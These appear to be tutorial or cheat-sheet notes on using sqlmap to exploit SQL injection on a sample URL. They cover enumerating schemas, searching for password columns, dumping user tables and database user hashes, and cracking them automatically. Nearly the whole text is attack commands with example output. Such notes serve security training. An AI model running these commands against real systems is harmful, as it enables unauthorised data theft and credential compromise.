
# DB Schema Enumeration

## Purpose

Shows:

- Databases
    
- Tables
    
- Columns
    
- Data types
    

Useful for understanding full DB structure.

## Command

```bash
sqlmap -u "http://target.com/?id=1" --schema
```

## Example Output

```text
Database: testdb
Table: users

Column   Type
------   ----------
id       int(11)
name     varchar(500)
surname  varchar(1000)
```

---

# Searching for Data

Useful when database has many tables/columns.

SQLMap searches names using SQL `LIKE`.

---

# Search Tables

## Find tables containing "user"

```bash
sqlmap -u "http://target.com/?id=1" --search -T user
```

Example result:

```text
users
user
USER_PRIVILEGES
```

---

# Search Columns

## Find columns containing "pass"

```bash
sqlmap -u "http://target.com/?id=1" --search -C pass
```

Example:

```text
password
Password
passwd
```

Useful for:

- Password columns
    
- API keys
    
- Tokens
    

---

# Password Enumeration

## Dump Password Table

```bash
sqlmap -u "http://target.com/?id=1" --dump -D master -T users
```

SQLMap detects hashes automatically.

Example:

```text
recognized possible password hashes
```

---

# Hash Cracking

SQLMap can crack hashes using dictionary attacks.

It asks:

```text
Do you want to crack them? [Y/n]
```

Uses:

- Built-in wordlist
    
- Multi-core cracking
    

Example:

```text
hash: 10945aa...
password: taqris
```

Supported:

- SHA1
    
- MD5
    
- MySQL hashes
    
- Many others
    

---

# DB Users Password Enumeration

## Dump Database User Passwords

```bash
sqlmap -u "http://target.com/?id=1" --passwords
```

Retrieves:

- DB usernames
    
- Password hashes
    

Example:

```text
root
debian-sys-maint
```

---

# Crack DB Passwords

SQLMap can also crack DB user hashes automatically.

Example:

```text
root : testpass
```

# Useful Enumeration Commands

|Command|Purpose|
|---|---|
|`--schema`|Show DB structure|
|`--search -T user`|Search tables|
|`--search -C pass`|Search columns|
|`--dump`|Dump data|
|`--passwords`|Dump DB user hashes|

---

# Important Options

|Option|Meaning|
|---|---|
|`-D`|Database|
|`-T`|Table|
|`-C`|Column|
|`--dump`|Extract rows|
|`--search`|Search names|
|`--schema`|Show structure|

---

# Full Automatic Enumeration

## Command

```bash
sqlmap -u "http://target.com/?id=1" --all --batch
```

## What it does

Automatically:

- Finds DB info
    
- Finds tables
    
- Dumps data
    
- Dumps passwords
    
- Cracks hashes
    

Very noisy and slow.

---

# Important Notes

- `--all` may take very long
    
- Blind SQLi enumeration is slow
    
- Use `-D`, `-T`, `-C` for faster extraction
    
- Search first before dumping huge databases
    
- Hash cracking works only if passwords are weak
